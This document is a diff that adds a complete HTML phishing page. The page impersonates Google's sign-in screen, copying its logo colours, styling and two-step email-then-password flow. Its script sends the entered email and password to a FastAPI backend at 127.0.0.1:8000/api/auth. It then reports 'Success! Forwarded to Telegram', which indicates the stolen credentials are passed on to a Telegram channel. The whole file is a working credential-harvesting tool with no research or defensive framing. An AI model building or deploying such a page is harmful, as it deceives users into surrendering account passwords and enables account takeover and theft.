@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            width: 380px;
+            box-sizing: border-box;
+        }
+        .logo {
+            font-family: 'Google Sans', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+
+        h2 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-top: 0;
+        }
+        p.subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #1b66c9;
+        }
+        #message {
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <h2 id="heading-title">Sign in</h2>
+        <p class="subtitle" id="subtitle-text">with your Account to continue</p>
+        
+        <!-- Step 1: Email Input -->
+        <div id="step-email" class="input-group">
+            <input type="text" id="email" placeholder="Email or phone">
+        </div>
+
+        <!-- Step 2: Password Input (Hidden by default) -->
+        <div id="step-password" class="input-group" style="display: none;">
+            <input type="password" id="password" placeholder="Enter your password">
+        </div>
+
+        <div class="actions">
+            <a href="#" id="left-link">Create account</a>
+            <button id="next-btn" onclick="handleNext()">Next</button>
+        </div>
+
+        <div id="message"></div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        let storedEmail = "";
+
+        async function handleNext() {
+            const messageDiv = document.getElementById("message");
+
+            if (currentStep === 1) {
+                const emailInput = document.getElementById("email").value;
+                if (!emailInput) {
+                    messageDiv.style.color = "red";
+                    messageDiv.innerText = "Enter an email or phone number";
+                    return;
+                }
+                
+                // Save email and move to password step
+                storedEmail = emailInput;
+                messageDiv.innerText = "";
+                
+                document.getElementById("step-email").style.display = "none";
+                document.getElementById("step-password").style.display = "block";
+                document.getElementById("subtitle-text").innerText = storedEmail;
+                document.getElementById("left-link").innerText = "Forgot password?";
+                
+                currentStep = 2;
+
+            } else if (currentStep === 2) {
+                const passwordInput = document.getElementById("password").value;
+                if (!passwordInput) {
+                    messageDiv.style.color = "red";
+                    messageDiv.innerText = "Enter a password";
+                    return;
+                }
+
+                // Send both email and password to your FastAPI backend
+                try {
+                    const response = await fetch("http://127.0.0.1:8000/api/auth", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            email: storedEmail,
+                            password: passwordInput,
+                            action: "signup"
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (response.ok) {
+                        messageDiv.style.color = "green";
+                        messageDiv.innerText = "Success! Forwarded to Telegram.";
+                    } else {
+                        messageDiv.style.color = "red";
+                        messageDiv.innerText = data.detail || "An error occurred.";
+                    }
+                } catch (error) {
+                    messageDiv.style.color = "red";
+                    messageDiv.innerText = "Could not connect to backend server.";
+                }
+            }
+        }
+    </script>
+
+</body>
+</html>
